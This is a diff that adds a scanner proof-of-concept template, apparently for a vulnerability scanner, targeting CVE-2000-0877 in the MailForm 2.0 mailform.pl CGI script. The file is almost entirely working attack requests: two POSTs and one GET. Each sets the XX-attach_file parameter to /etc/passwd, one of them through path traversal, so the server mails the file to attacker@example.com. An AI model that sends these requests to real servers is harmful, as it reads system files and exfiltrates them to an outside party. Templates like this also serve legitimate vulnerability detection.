@@ -1,0 +1,94 @@
+[info]
+author = "ave"
+description = "验证 MailForm 2.0 mailform.pl CGI 脚本的 XX-attach_file 参数任意文件读取漏洞。攻击者可通过 POST 请求指定 XX-attach_file 参数为敏感文件路径（如 /etc/passwd），脚本会将文件内容作为附件发送。PoC 通过发送包含测试文件路径的 POST 请求验证漏洞是否存在。"
+id = "POC-AVE-2000-0989"
+name = "CVE-2000-0877 PoC"
+severity = "medium"
+tags = ["ave-2000-0989"]
+vuln_id = [
+    "CVE-2000-0877",
+    "AVE-2000-0989",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/mailform.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "XX-attach_file=/etc/passwd&recipient=attacker@example.com&subject=test&email=test@test.com&realname=test&redirect=http://example.com&submit=Submit"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "MailForm",
+    "Thank you",
+    "sent",
+    "thank you",
+    "success",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/mailform.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "XX-attach_file=../../../../etc/passwd&recipient=attacker@example.com&subject=test&email=test@test.com&realname=test&redirect=http://example.com&submit=Submit"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "MailForm",
+    "Thank you",
+    "sent",
+    "thank you",
+    "success",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/mailform.pl?XX-attach_file=/etc/passwd&recipient=attacker@example.com&subject=test&email=test@test.com&realname=test&redirect=http://example.com"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "MailForm",
+    "Thank you",
+    "sent",
+    "thank you",
+    "success",
+]
